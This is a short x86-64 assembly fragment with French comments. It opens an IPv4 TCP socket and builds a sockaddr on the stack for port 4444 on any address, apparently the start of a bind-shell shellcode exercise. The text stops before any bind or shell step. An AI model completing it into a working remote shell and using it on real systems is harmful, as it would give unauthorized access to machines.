global _start

section .text
_start:

;socket parametre : inet : IPv4, sock stream = 1, 0
mov rax, 0x29   ; syscall socket
mov rdi, 2      ; inet en IPv4
mov rsi, 1      ; sock stream pour tcp
mov rdx, 0      ; protocol = 0 le noyau chosiit auto tcp
syscall

;sockaddr
xor rbx, rbx    ;
push rbx        ; sin addr =
push rbx        ;
mov rbx, 0x5c110002
push rbx
mov rsi, rsp    ;